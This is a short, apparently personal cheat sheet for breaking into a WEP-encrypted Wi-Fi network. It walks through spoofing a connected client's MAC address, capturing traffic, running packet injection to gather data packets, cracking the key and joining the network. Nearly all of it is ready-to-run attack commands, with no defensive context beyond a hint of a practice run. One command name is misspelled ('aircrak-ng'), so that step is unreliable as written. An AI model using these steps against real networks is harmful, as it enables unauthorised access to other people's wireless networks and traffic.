#### WEP

Spoof MAC of a connected station
```
ip link set wlan1mon down
macchanger -m XX:XX:XX:XX:XX:XX wlan1mon
ip link set wlan1mon up
ip a
```

Capture frames
```
airodump-ng wlan1mon -c X --bssid XX:XX:XX:XX:XX:XX --essid ESSID -w wep_capture
```

Injection
```
aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h <SPOOFED_MAC> wlan1mon
```

Notice the #Data packets and stopped both tools after around 50000.

Cracking
```
aircrak-ng wep_capture.cap
```

Connection
```
iwconfig wlan0 essid ESSID key XX:XX:XX:XX:XX
ifconfig wlan0 up
dhclient wlan0
```